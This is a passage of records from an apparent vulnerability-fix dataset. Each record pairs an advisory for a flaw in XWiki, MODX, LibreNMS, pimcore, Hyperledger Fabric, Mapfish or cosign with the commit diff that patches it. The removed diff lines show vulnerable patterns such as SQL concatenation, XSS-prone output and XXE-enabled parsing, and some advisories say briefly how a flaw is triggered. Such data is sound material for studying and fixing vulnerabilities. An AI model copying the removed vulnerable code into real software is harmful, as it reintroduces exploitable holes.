category=\"error\")\\n             return redirect(url_for(\\'web.index\\'))\\n-        is_public = 1 if to_save.get(\"is_public\") else 0\\n+        is_public = 1 if to_save.get(\"is_public\") == \"on\" else 0\\n         if config.config_kobo_sync:\\n             shelf.kobo_sync = True if to_save.get(\"kobo_sync\") else False\\n             if shelf.kobo_sync:'}}","message_norm":"prevent creating a public shelf without permission","language":"en","entities":"[('prevent', 'ACTION', ''), ('permission', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['cps\/shelf.py'])","num_files":1.0},{"index":3118,"vuln_id":"GHSA-vh5c-jqfg-mhrh","cwe_id":"{'CWE-352'}","score":7.5,"chain":"{'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/69548c0320cbd772540cf4668743e69f879812cf', 'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/f0440dfcbba705e03f7565cd88893dde57ca3fa8'}","dataset":"osv","summary":"Cross-Site Request Forgery in xwiki-platform ### Impact\nIt's possible to know if a user has or not an account in a wiki related to an email address, and which username(s) is actually tight to that email by forging a request to the Forgot username page. Note that since this page does not have a CSRF check it's quite easy to perform a lot of those requests.\n\n### Patches\nThis issue has been patched in XWiki 12.10.5 and 13.2RC1. Two different patches are provided:\n  - a first one to fix the CSRF problem\n  - a more complex one that now relies on sending an email for the Forgot username process.\n\n### Workarounds\nIt's possible to fix the problem without uprading by editing the ForgotUsername page in version below 13.x, to use the following code: https:\/\/github.com\/xwiki\/xwiki-platform\/blob\/69548c0320cbd772540cf4668743e69f879812cf\/xwiki-platform-core\/xwiki-platform-administration\/xwiki-platform-administration-ui\/src\/main\/resources\/XWiki\/ForgotUsername.xml#L39-L123\n\nIn version after 13.x it's also possible to edit manually the forgotusername.vm file, but it's really encouraged to upgrade the version here.\n\n### References\n  * https:\/\/jira.xwiki.org\/browse\/XWIKI-18384\n  * https:\/\/jira.xwiki.org\/browse\/XWIKI-18408\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki](https:\/\/jira.xwiki.org)\n* Email us at [security ML](mailto:security@xwiki.org)","published_date":"2022-02-10","chain_len":2,"project":"https:\/\/github.com\/xwiki\/xwiki-platform","commit_href":"https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/69548c0320cbd772540cf4668743e69f879812cf","commit_sha":"69548c0320cbd772540cf4668743e69f879812cf","patch":"MULTI","chain_ord":"['f0440dfcbba705e03f7565cd88893dde57ca3fa8', '69548c0320cbd772540cf4668743e69f879812cf']","before_first_fix_commit":"{'dfa1479abcdbc3a3b906fdab62841c22f5c13e38'}","last_fix_commit":"69548c0320cbd772540cf4668743e69f879812cf","chain_ord_pos":2.0,"commit_datetime":"03\/09\/2021, 12:23:38","message":"XWIKI-18408: Wrong check in forgot username","author":"Simon Urli","comments":null,"stats":"{'additions': 9, 'deletions': 2, 'total': 11}","files":"{'xwiki-platform-core\/xwiki-platform-administration\/xwiki-platform-administration-ui\/src\/main\/resources\/XWiki\/ForgotUsername.xml': {'additions': 9, 'deletions': 2, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/xwiki\/xwiki-platform\/raw\/69548c0320cbd772540cf4668743e69f879812cf\/xwiki-platform-core%2Fxwiki-platform-administration%2Fxwiki-platform-administration-ui%2Fsrc%2Fmain%2Fresources%2FXWiki%2FForgotUsername.xml', 'patch': '@@ -38,12 +38,19 @@\\n   <hidden>true<\/hidden>\\n   <content>{{velocity}}\\n #set($email = \"$!request.get(\\'e\\')\")\\n-#if($email == \\'\\')\\n+#if($email == \\'\\' || !$services.csrf.isTokenValid($request.form_token))\\n {{translation key=\"xe.admin.forgotUsername.instructions\"\/}}\\n \\n {{html}}\\n   &lt;form method=\"post\" action=\"$doc.getURL()\" class=\"xformInline\"&gt;\\n-    &lt;div&gt;&lt;label for=\"e\"&gt;$services.localization.render(\\'xe.admin.forgotUsername.email.label\\')&lt;\/label&gt; &lt;input type=\"text\" id=\"e\" name=\"e\"\/&gt; &lt;span class=\"buttonwrapper\"&gt;&lt;input type=\"submit\" value=\"$services.localization.render(\\'xe.admin.forgotUsername.submit\\')\" class=\"button\"\/&gt;&lt;\/span&gt;&lt;\/div&gt;\\n+    &lt;div&gt;\\n+      &lt;label for=\"e\"&gt;$services.localization.render(\\'xe.admin.forgotUsername.email.label\\')&lt;\/label&gt;\\n+      &lt;input type=\"text\" id=\"e\" name=\"e\"\/&gt;\\n+      &lt;input type=\"hidden\" name=\"form_token\" value=\"$services.csrf.getToken()\"\/&gt;\\n+      &lt;span class=\"buttonwrapper\"&gt;\\n+        &lt;input type=\"submit\" value=\"$services.localization.render(\\'xe.admin.forgotUsername.submit\\')\" class=\"button\"\/&gt;\\n+      &lt;\/span&gt;\\n+    &lt;\/div&gt;\\n   &lt;\/form&gt;\\n {{\/html}}'}}","message_norm":"xwiki-18408: wrong check in forgot username","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xwiki-platform-core\/xwiki-platform-administration\/xwiki-platform-administration-ui\/src\/main\/resources\/XWiki\/ForgotUsername.xml'])","num_files":1.0},{"index":3124,"vuln_id":"GHSA-vhfp-9wvj-gwvg","cwe_id":"{'CWE-611'}","score":9.1,"chain":"{'https:\/\/github.com\/modxcms\/revolution\/pull\/15238\/commits\/1b7ffe02df30f05dbf67dd15e4d8101687c1585a'}","dataset":"osv","summary":"XML External Entity vulnerability in MODX CMS A XML External Entity (XXE) vulnerability was discovered in the modRestServiceRequest component in MODX CMS 2.7.3 which can lead to an information disclosure or denial of service (DOS).","published_date":"2021-11-01","chain_len":1,"project":"https:\/\/github.com\/modxcms\/revolution","commit_href":"https:\/\/github.com\/modxcms\/revolution\/pull\/15238\/commits\/1b7ffe02df30f05dbf67dd15e4d8101687c1585a","commit_sha":"1b7ffe02df30f05dbf67dd15e4d8101687c1585a","patch":"SINGLE","chain_ord":"['1b7ffe02df30f05dbf67dd15e4d8101687c1585a']","before_first_fix_commit":"{'97b4e469500d54cf55a889b18f466a9cc6573983'}","last_fix_commit":"1b7ffe02df30f05dbf67dd15e4d8101687c1585a","chain_ord_pos":1.0,"commit_datetime":"09\/18\/2020, 09:14:28","message":"Prevent potential XXE vulnerability in modRestService by disabling the libxml entity loader [#15237]\n\nThe libxml_disable_entity_loader function is deprecated in PHP8, and the entity loader is automatically enabled on v2.9.0+ of libxml which may have been used pre-PHP8 as well. PHP8 comes with at least v2.9.0+ of libxml bundled, so this conditional covers both scenarios.\n\nRef: https:\/\/github.com\/php\/php-src\/pull\/5867","author":"Mark Hamstra","comments":null,"stats":"{'additions': 9, 'deletions': 1, 'total': 10}","files":"{'core\/model\/modx\/rest\/modrestservice.class.php': {'additions': 9, 'deletions': 1, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/modxcms\/revolution\/raw\/1b7ffe02df30f05dbf67dd15e4d8101687c1585a\/core%2Fmodel%2Fmodx%2Frest%2Fmodrestservice.class.php', 'patch': \"@@ -59,6 +59,7 @@ public function __construct(modX &$modx,array $config = array()) {\\n             'responseSuccessKey' => 'success',\\n             'trimParameters' => false,\\n             'xmlRootNode' => 'response',\\n+            'xmlDisableEntityLoader' => true,\\n \\t\\t),$config);\\n \\t\\t$this->modx->getService('lexicon','modLexicon');\\n         if ($this->modx->lexicon) {\\n@@ -397,7 +398,14 @@ protected function _collectRequestParameters() {\\n             case 'text\/xml':\\n                 $data = stream_get_contents($filehandle);\\n                 fclose($filehandle);\\n-                $xml = simplexml_load_string($data);\\n+                if (LIBXML_VERSION < 20900 && $this->service->getOption('xmlDisableEntityLoader')) {\\n+                    $disableEntities = libxml_disable_entity_loader(true);\\n+                    $xml = simplexml_load_string($data);\\n+                    libxml_disable_entity_loader($disableEntities);\\n+                }\\n+                else {\\n+                    $xml = simplexml_load_string($data);\\n+                }\\n                 $params = $this->_xml2array($xml);\\n                 break;\\n             case 'application\/json':\"}}","message_norm":"prevent potential xxe vulnerability in modrestservice by disabling the libxml entity loader [#15237]\n\nthe libxml_disable_entity_loader function is deprecated in php8, and the entity loader is automatically enabled on v2.9.0+ of libxml which may have been used pre-php8 as well. php8 comes with at least v2.9.0+ of libxml bundled, so this conditional covers both scenarios.\n\nref: https:\/\/github.com\/php\/php-src\/pull\/5867","language":"en","entities":"[('prevent', 'ACTION', ''), ('xxe', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('#15237', 'ISSUE', ''), ('v2.9.0', 'VERSION', ''), ('v2.9.0', 'VERSION', ''), ('https:\/\/github.com\/php\/php-src\/pull\/5867', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/model\/modx\/rest\/modrestservice.class.php'])","num_files":1.0},{"index":3126,"vuln_id":"GHSA-vhm6-gw82-6f8j","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/librenms\/librenms\/commit\/703745d0ed3948623153117d761ce48514e2f281'}","dataset":"osv","summary":"Cross site scripting in LibreNMS LibreNMS prior to version 22.2.2 is vulnerable to cross-site scripting.","published_date":"2022-02-28","chain_len":1,"project":"https:\/\/github.com\/librenms\/librenms","commit_href":"https:\/\/github.com\/librenms\/librenms\/commit\/703745d0ed3948623153117d761ce48514e2f281","commit_sha":"703745d0ed3948623153117d761ce48514e2f281","patch":"SINGLE","chain_ord":"['703745d0ed3948623153117d761ce48514e2f281']","before_first_fix_commit":"{'09929bd6865e54034db591ea37f5548406f5e716'}","last_fix_commit":"703745d0ed3948623153117d761ce48514e2f281","chain_ord_pos":1.0,"commit_datetime":"02\/22\/2022, 14:28:31","message":"Resolved XSS issue from alert rule list modal (#13805)","author":"Neil Lathwood","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'includes\/html\/modal\/alert_rule_list.inc.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/librenms\/librenms\/raw\/703745d0ed3948623153117d761ce48514e2f281\/includes%2Fhtml%2Fmodal%2Falert_rule_list.inc.php', 'patch': '@@ -62,7 +62,7 @@\\n                             echo \"\\n                                 <tr>\\n                                     <td>{$rule[\\'name\\']}<\/td>\\n-                                    <td><i>\" . htmlentities($rule_display) . \"<\/i><\/td>\\n+                                    <td><i>\" . htmlentities(strip_tags($rule_display)) . \"<\/i><\/td>\\n                                     <td>{$rule[\\'severity\\']}<\/td>\\n                                     <td>{$rule[\\'id\\']}<\/td>\\n                                 <\/tr>'}}","message_norm":"resolved xss issue from alert rule list modal (#13805)","language":"no","entities":"[('xss', 'SECWORD', ''), ('issue', 'FLAW', ''), ('#13805', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['includes\/html\/modal\/alert_rule_list.inc.php'])","num_files":1.0},{"index":3131,"vuln_id":"GHSA-vj9x-w7ch-f46p","cwe_id":"{'CWE-89'}","score":8.3,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/66281c12479dc01a06258d8533eaddfb1770d5bd'}","dataset":"osv","summary":"pimcore is vulnerable to SQL Injection pimcore is vulnerable to Improper Neutralization of Special Elements used in an SQL Command","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/66281c12479dc01a06258d8533eaddfb1770d5bd","commit_sha":"66281c12479dc01a06258d8533eaddfb1770d5bd","patch":"SINGLE","chain_ord":"['66281c12479dc01a06258d8533eaddfb1770d5bd']","before_first_fix_commit":"{'d8377fc752dc3a42ca72cb49650481191f14ec63'}","last_fix_commit":"66281c12479dc01a06258d8533eaddfb1770d5bd","chain_ord_pos":1.0,"commit_datetime":"01\/17\/2022, 14:39:43","message":"[Data Object] Classification Store quote filtering","author":"Bernhard Rusch","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'bundles\/AdminBundle\/Controller\/Admin\/DataObject\/ClassificationstoreController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/66281c12479dc01a06258d8533eaddfb1770d5bd\/bundles%2FAdminBundle%2FController%2FAdmin%2FDataObject%2FClassificationstoreController.php', 'patch': \"@@ -1242,7 +1242,7 @@ public function propertiesGetAction(Request $request)\\n         }\\n \\n         if ($storeId) {\\n-            $conditionParts[] = '(storeId = ' . $storeId . ')';\\n+            $conditionParts[] = '(storeId = '. $db->quote($storeId) . ')';\\n         }\\n \\n         if ($request->get('filter')) {\"}}","message_norm":"[data object] classification store quote filtering","language":"it","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Controller\/Admin\/DataObject\/ClassificationstoreController.php'])","num_files":1.0},{"index":3133,"vuln_id":"GHSA-vjj6-5m9f-wqjw","cwe_id":"{'CWE-476'}","score":7.5,"chain":"{'https:\/\/github.com\/hyperledger\/fabric\/pull\/2838\/commits\/ebf94b10ecc86d3a91619b98befc52277b1e3474'}","dataset":"osv","summary":"NULL Pointer Dereference in HyperLedger Fabric A vulnerability has been detected in HyperLedger Fabric v1.4.0, v2.0.0, v2.1.0. This bug can be leveraged by constructing a message whose payload is nil and sending this message with the method 'forwardToLeader'. This bug has been admitted and fixed by the developers of Fabric. If leveraged, any leader node will crash.","published_date":"2022-05-25","chain_len":1,"project":"https:\/\/github.com\/hyperledger\/fabric","commit_href":"https:\/\/github.com\/hyperledger\/fabric\/pull\/2838\/commits\/ebf94b10ecc86d3a91619b98befc52277b1e3474","commit_sha":"ebf94b10ecc86d3a91619b98befc52277b1e3474","patch":"SINGLE","chain_ord":"['ebf94b10ecc86d3a91619b98befc52277b1e3474']","before_first_fix_commit":"{'bb8bada7b864d4135aafe1785674be31d6cc78cb'}","last_fix_commit":"ebf94b10ecc86d3a91619b98befc52277b1e3474","chain_ord_pos":1.0,"commit_datetime":"08\/18\/2021, 14:18:10","message":"FAB18529 added nil check in channel header parsing\n\nFuzz testing has reported SEGV while sending incomplete\/null\nmessage request to orderer.\n\nSigned-off-by: Parameswaran Selvam <parselva@in.ibm.com>","author":"Parameswaran Selvam","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'protoutil\/commonutils.go': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hyperledger\/fabric\/raw\/ebf94b10ecc86d3a91619b98befc52277b1e3474\/protoutil%2Fcommonutils.go', 'patch': '@@ -212,6 +212,10 @@ func IsConfigBlock(block *cb.Block) bool {\\n \\n \/\/ ChannelHeader returns the *cb.ChannelHeader for a given *cb.Envelope.\\n func ChannelHeader(env *cb.Envelope) (*cb.ChannelHeader, error) {\\n+\\tif env == nil {\\n+\\t\\treturn nil, errors.New(\"Invalid envelope payload. can\\'t be nil\")\\n+\\t}\\n+\\n \\tenvPayload, err := UnmarshalPayload(env.Payload)\\n \\tif err != nil {\\n \\t\\treturn nil, err'}}","message_norm":"fab18529 added nil check in channel header parsing\n\nfuzz testing has reported segv while sending incomplete\/null\nmessage request to orderer.\n\nsigned-off-by: parameswaran selvam <parselva@in.ibm.com>","language":"en","entities":"[('fab18529', 'SHA', 'generic_sha'), ('added', 'ACTION', ''), ('fuzz', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['protoutil\/commonutils.go'])","num_files":1.0},{"index":3135,"vuln_id":"GHSA-vjv6-gq77-3mjw","cwe_id":"{'CWE-611'}","score":9.3,"chain":"{'https:\/\/github.com\/mapfish\/mapfish-print\/pull\/1397\/commits\/e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e'}","dataset":"osv","summary":"XXE attack in Mapfish Print ### Impact\nA user can do to an XML External Entity (XXE) attack with the provided SDL style.\n\n### Patches\nUse version >= 3.24\n\n### Workarounds\nNo\n\n### References\n* https:\/\/cwe.mitre.org\/data\/definitions\/611.html\n* https:\/\/github.com\/mapfish\/mapfish-print\/pull\/1397\/commits\/e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e\n\n### For more information\nIf you have any questions or comments about this advisory Comment the pull request: https:\/\/github.com\/mapfish\/mapfish-print\/pull\/1397","published_date":"2020-07-07","chain_len":1,"project":"https:\/\/github.com\/mapfish\/mapfish-print","commit_href":"https:\/\/github.com\/mapfish\/mapfish-print\/pull\/1397\/commits\/e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e","commit_sha":"e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e","patch":"SINGLE","chain_ord":"['e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e']","before_first_fix_commit":"{'4b59454140e1bd312c728d99d7de82714000c195'}","last_fix_commit":"e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e","chain_ord_pos":1.0,"commit_datetime":"07\/02\/2020, 14:25:50","message":"See: https:\/\/github.com\/mapfish\/mapfish-print\/security\/code-scanning\/3?query=ref%3Arefs%2Fheads%2Fmaster","author":"St\u00e9phane Brunner","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'core\/src\/main\/java\/org\/mapfish\/print\/map\/style\/SLDParserPlugin.java': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mapfish\/mapfish-print\/raw\/e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e\/core%2Fsrc%2Fmain%2Fjava%2Forg%2Fmapfish%2Fprint%2Fmap%2Fstyle%2FSLDParserPlugin.java', 'patch': '@@ -94,6 +94,7 @@ private Optional<Style> tryLoadSLD(\\n             \/\/ by setting a custom error handler.\\n             DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\\n             dbf.setNamespaceAware(true);\\n+            dbf.setFeature(\"http:\/\/apache.org\/xml\/features\/disallow-doctype-decl\", true);\\n             DocumentBuilder db = dbf.newDocumentBuilder();\\n             db.setErrorHandler(new ErrorHandler());\\n             db.parse(new ByteArrayInputStream(bytes));'}}","message_norm":"see: https:\/\/github.com\/mapfish\/mapfish-print\/security\/code-scanning\/3?query=ref%3arefs%2fheads%2fmaster","language":"en","entities":"[('https:\/\/github.com\/mapfish\/mapfish-print\/security\/code-scanning\/3?query=ref%3arefs%2fheads%2fmaster', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/org\/mapfish\/print\/map\/style\/SLDParserPlugin.java'])","num_files":1.0},{"index":3137,"vuln_id":"GHSA-vjxv-45g9-9296","cwe_id":"{'CWE-347'}","score":7.1,"chain":"{'https:\/\/github.com\/sigstore\/cosign\/commit\/c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94'}","dataset":"osv","summary":"cosign's `cosign verify-attestaton  --type` can report a false positive if any attestation exists `cosign verify-attestation` used with the `--type` flag will report a false positive verification when:\n\n- There is at least one attestation with a valid signature\n- There are NO attestations of the type being verified (--type defaults to \"custom\")\n\nThis can happen when signing with a standard keypair and with \"keyless\" signing with Fulcio. Users should upgrade to cosign version 1.10.1 or greater for a patch. Currently the only workaround is to upgrade.","published_date":"2022-08-10","chain_len":1,"project":"https:\/\/github.com\/sigstore\/cosign","commit_href":"https:\/\/github.com\/sigstore\/cosign\/commit\/c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94","commit_sha":"c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94","patch":"SINGLE","chain_ord":"['c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94']","before_first_fix_commit":"{'641f02b146816da54f112e1c1227747da17e5020'}","last_fix_commit":"c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94","chain_ord_pos":1.0,"commit_datetime":"08\/04\/2022, 16:05:27","message":"Merge pull request from GHSA-vjxv-45g9-9296\n\nToday the verification logic:\n1. Verifies signatures on attestations (at least one must verify, or it errors),\n2. All attestations matching the specified `--type` must pass any specified Cue\/Rego policies,\n3. *All* signature-verified attestations are then printed.\n\nHowever, if NONE of the attestations match the specified `--type` then `2.` is considered satisfied and we proceed to `3.`\n\nThis changes the above logic to:\n1. Same.\n2. Same, but these are put into a `checked` list,\n3. `checked` must be non-empty (or an error is printed about no attestations matching `--type`),\n4. *Just* the `checked` attestations are printed.\n\n---\n\nThe bug at HEAD:\n```shell\n$ cosign verify-attestation --type spdx ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2\n\nVerification for ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2 --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - Existence of the claims in the transparency log was verified offline\n  - Any certificates were verified against the Fulcio roots.\nCertificate subject:  https:\/\/github.com\/distroless\/static\/.github\/workflows\/release.yaml@refs\/heads\/main\nCertificate issuer URL:  https:\/\/token.actions.githubusercontent.com\nCertificate extension GitHub Workflow Trigger: schedule\nCertificate extension GitHub Workflow SHA: 7e7572e578de7c51a2f1a1791f025cf315503aa2\nCertificate extension GitHub Workflow Name: Create Release\nCertificate extension GitHub Workflow Trigger distroless\/static\nCertificate extension GitHub Workflow Ref: refs\/heads\/main\n{\"payloadType\":\"application\/vnd.in-toto+json\",\"payload\":\"eyJfdHlwZSI6Imh0dHBzOi8vaW4tdG90by5pby9TdGF0ZW1lbnQvdjAuMSIsInByZWRpY2F0ZVR5cGUiOiJjb3NpZ24uc2lnc3RvcmUuZGV2L2F0dGVzdGF0aW9uL3Z1bG4vdjEiLCJzdWJqZWN0IjpbeyJuYW1lIjoiZ2hjci5pby9kaXN0cm9sZXNzL3N0YXRpYyIsImRpZ2VzdCI6eyJzaGEyNTYiOiJkZDc2MTRiNWExMmJjNGQ2MTdiMjIzYzU4OGI0ZTBjODMzNDAyYjhmNDk5MWZiNTcwMmVhODNhZmFkMTk4NmUyIn19XSwicHJlZGljYXRlIjp7Imludm9jYXRpb24iOnsicGFyYW1ldGVycyI6bnVsbCwidXJpIjoiaHR0cHM6Ly9naXRodWIuY29tL2Rpc3Ryb2xlc3Mvc3RhdGljL2FjdGlvbnMvcnVucy8yNzc5MjEyNzA1IiwiZXZlbnRfaWQiOiIyNzc5MjEyNzA1IiwiYnVpbGRlci5pZCI6IkNyZWF0ZSBSZWxlYXNlIn0sInNjYW5uZXIiOnsidXJpIjoiaHR0cHM6Ly9naXRodWIuY29tL2FxdWFzZWN1cml0eS90cml2eSIsInZlcnNpb24iOiIwLjI5LjIiLCJkYiI6eyJ1cmkiOiIiLCJ2ZXJzaW9uIjoiIn0sInJlc3VsdCI6eyIkc2NoZW1hIjoiaHR0cHM6Ly9qc29uLnNjaGVtYXN0b3JlLm9yZy9zYXJpZi0yLjEuMC1ydG0uNS5qc29uIiwicnVucyI6W3siY29sdW1uS2luZCI6InV0ZjE2Q29kZVVuaXRzIiwib3JpZ2luYWxVcmlCYXNlSWRzIjp7IlJPT1RQQVRIIjp7InVyaSI6ImZpbGU6Ly8vIn19LCJyZXN1bHRzIjpbXSwidG9vbCI6eyJkcml2ZXIiOnsiZnVsbE5hbWUiOiJUcml2eSBWdWxuZXJhYmlsaXR5IFNjYW5uZXIiLCJpbmZvcm1hdGlvblVyaSI6Imh0dHBzOi8vZ2l0aHViLmNvbS9hcXVhc2VjdXJpdHkvdHJpdnkiLCJuYW1lIjoiVHJpdnkiLCJydWxlcyI6W10sInZlcnNpb24iOiIwLjI5LjIifX19XSwidmVyc2lvbiI6IjIuMS4wIn19LCJtZXRhZGF0YSI6eyJzY2FuU3RhcnRlZE9uIjoiMjAyMi0wOC0wMlQwMjozMzo0N1oiLCJzY2FuRmluaXNoZWRPbiI6IjIwMjItMDgtMDJUMDI6MzM6NTNaIn19fQ==\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"MEYCIQCovBtLOBXyB2zpvhp3j6QzqLtsH0\/RC7fRINSApySqxAIhAIKlzu1fXuKPPOIheNnsPmBOB6XfZbRs5sDW1yFSch1A\"}]}\n```\n\nThe same with this change:\n```shell\n$ go run .\/cmd\/cosign verify-attestation --type spdx ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2\nError: none of the attestations matched the predicate type: spdx\nmain.go:62: error during command execution: none of the attestations matched the predicate type: spdx\nexit status 1\n```\n\nA valid `--type` with this change:\n```shell\n$ go run .\/cmd\/cosign verify-attestation --type vuln ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2\n\nVerification for ghcr.io\/distroless\/static@sha256:dd7614b5a12bc4d617b223c588b4e0c833402b8f4991fb5702ea83afad1986e2 --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - Existence of the claims in the transparency log was verified offline\n  - Any certificates were verified against the Fulcio roots.\nCertificate subject:  https:\/\/github.com\/distroless\/static\/.github\/workflows\/release.yaml@refs\/heads\/main\nCertificate issuer URL:  https:\/\/token.actions.githubusercontent.com\nCertificate extension GitHub Workflow Trigger: schedule\nCertificate extension GitHub Workflow SHA: 7e7572e578de7c51a2f1a1791f025cf315503aa2\nCertificate extension GitHub Workflow Name: Create Release\nCertificate extension GitHub Workflow Trigger distroless\/static\nCertificate extension GitHub Workflow Ref: refs\/heads\/main\n{\"payloadType\":\"application\/vnd.in-toto+json\",\"payload\":\"eyJfdHlwZSI6Imh0dHBzOi8vaW4tdG90by5pby9TdGF0ZW1lbnQvdjAuMSIsInByZWRpY2F0ZVR5cGUiOiJjb3NpZ24uc2lnc3RvcmUuZGV2L2F0dGVzdGF0aW9uL3Z1bG4vdjEiLCJzdWJqZWN0IjpbeyJuYW1lIjoiZ2hjci5pby9kaXN0cm9sZXNzL3N0YXRpYyIsImRpZ2VzdCI6eyJzaGEyNTYiOiJkZDc2MTRiNWExMmJjNGQ2MTdiMjIzYzU4OGI0ZTBjODMzNDAyYjhmNDk5MWZiNTcwMmVhODNhZmFkMTk4NmUyIn19XSwicHJlZGljYXRlIjp7Imludm9jYXRpb24iOnsicGFyYW1ldGVycyI6bnVsbCwidXJpIjoiaHR0cHM6Ly9naXRodWIuY29tL2Rpc3Ryb2xlc3Mvc3RhdGljL2FjdGlvbnMvcnVucy8yNzc5MjEyNzA1IiwiZXZlbnRfaWQiOiIyNzc5MjEyNzA1IiwiYnVpbGRlci5pZCI6IkNyZWF0ZSBSZWxlYXNlIn0sInNjYW5uZXIiOnsidXJpIjoiaHR0cHM6Ly9naXRodWIuY29tL2FxdWFzZWN1cml0eS90cml2eSIsInZlcnNpb24iOiIwLjI5LjIiLCJkYiI6eyJ1cmkiOiIiLCJ2ZXJzaW9uIjoiIn0sInJlc3VsdCI6eyIkc2NoZW1hIjoiaHR0cHM6Ly9qc29uLnNjaGVtYXN0b3JlLm9yZy9zYXJpZi0yLjEuMC1ydG0uNS5qc29uIiwicnVucyI6W3siY29sdW1uS2luZCI6InV0ZjE2Q29kZVVuaXRzIiwib3JpZ2luYWxVcmlCYXNlSWRzIjp7IlJPT1RQQVRIIjp7InVyaSI6ImZpbGU6Ly8vIn19LCJyZXN1bHRzIjpbXSwidG9vbCI6eyJkcml2ZXIiOnsiZnVsbE5hbWUiOiJUcml2eSBWdWxuZXJhYmlsaXR5IFNjYW5uZXIiLCJpbmZvcm1hdGlvblVyaSI6Imh0dHBzOi8vZ2l0aHViLmNvbS9hcXVhc2VjdXJpdHkvdHJpdnkiLCJuYW1lIjoiVHJpdnkiLCJydWxlcyI6W10sInZlcnNpb24iOiIwLjI5LjIifX19XSwidmVyc2lvbiI6IjIuMS4wIn19LCJtZXRhZGF0YSI6eyJzY2FuU3RhcnRlZE9uIjoiMjAyMi0wOC0wMlQwMjozMzo0N1oiLCJzY2FuRmluaXNoZWRPbiI6IjIwMjItMDgtMDJUMDI6MzM6NTNaIn19fQ==\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"MEYCIQCovBtLOBXyB2zpvhp3j6QzqLtsH0\/RC7fRINSApySqxAIhAIKlzu1fXuKPPOIheNnsPmBOB6XfZbRs5sDW1yFSch1A\"}]}\n```\n\nSigned-off-by: Matt Moore <mattmoor@chainguard.dev>","author":"Matt Moore","comments":null,"stats":"{'additions': 10, 'deletions': 1, 'total': 11}","files":"{'cmd\/cosign\/cli\/verify\/verify_attestation.go': {'additions': 10, 'deletions': 1, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sigstore\/cosign\/raw\/c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94\/cmd%2Fcosign%2Fcli%2Fverify%2Fverify_attestation.go', 'patch': '@@ -201,6 +201,7 @@ func (c *VerifyAttestationCommand) Exec(ctx context.Context, images []string) (e\\n \\t\\t\\t}\\n \\t\\t}\\n \\n+\\t\\tvar checked []oci.Signature\\n \\t\\tvar validationErrors []error\\n \\t\\tfor _, vp := range verified {\\n \\t\\t\\tpayload, err := policy.AttestationToPayloadJSON(ctx, c.PredicateType, vp)\\n@@ -217,6 +218,7 @@ func (c *VerifyAttestationCommand) Exec(ctx context.Context, images []string) (e\\n \\t\\t\\t\\tcueValidationErr := cue.ValidateJSON(payload, cuePolicies)\\n \\t\\t\\t\\tif cueValidationErr != nil {\\n \\t\\t\\t\\t\\tvalidationErrors = append(validationErrors, cueValidationErr)\\n+\\t\\t\\t\\t\\tcontinue\\n \\t\\t\\t\\t}\\n \\t\\t\\t}\\n \\n@@ -225,8 +227,11 @@ func (c *VerifyAttestationCommand) Exec(ctx context.Context, images []string) (e\\n \\t\\t\\t\\tregoValidationErrs := rego.ValidateJSON(payload, regoPolicies)\\n \\t\\t\\t\\tif len(regoValidationErrs) > 0 {\\n \\t\\t\\t\\t\\tvalidationErrors = append(validationErrors, 